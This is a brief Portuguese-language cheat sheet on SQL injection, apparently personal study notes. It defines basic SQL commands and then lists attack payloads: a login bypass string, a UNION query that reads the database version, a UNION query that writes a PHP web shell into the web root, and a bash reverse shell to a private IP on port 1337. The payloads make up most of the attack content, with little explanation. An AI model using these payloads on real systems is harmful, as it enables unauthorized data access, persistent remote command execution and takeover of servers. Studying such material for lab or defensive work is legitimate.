# SQL Injection

**SQL (Structured Query Language)**

**SQL Injection** é uma vulnerabilidade que permite a injeção de comandos SQL em um servidor vulnerável.

`' OR '1'='1`

**Principais comandos:**\
SELECT = Usado para consultar dados em uma tabela.\
`SELECT coluna1, coluna2 FROM nome_tabela WHERE condição;`\
\
INSERT = Insere novos registros em uma tabela.\
`INSERT INTO nome_tabela (coluna1, coluna2) VALUES (valor1, valor2);`\
\
UPDATE = Atualiza dados existentes em uma tabela.\
`UPDATE nome_tabela SET coluna1 = valor1 WHERE condição;`\
\
DELETE = Remove registros de uma tabela. \
`DELETE FROM nome_tabela WHERE condição;`&#x20;

**Comentarar código em SQL:** \
\#\
— -



' union select 1,@@VERSION,3,4;#

database()\
user()





' union select 1,2,3,"\<?php system($\_GET\[0]);?>" into outfile "/var/www/html/shell.php" — -

\#!/bin/bash\
/bin/bash -c 'sh -i >& /dev/tcp/10.0.60.238/1337 0>&1'



























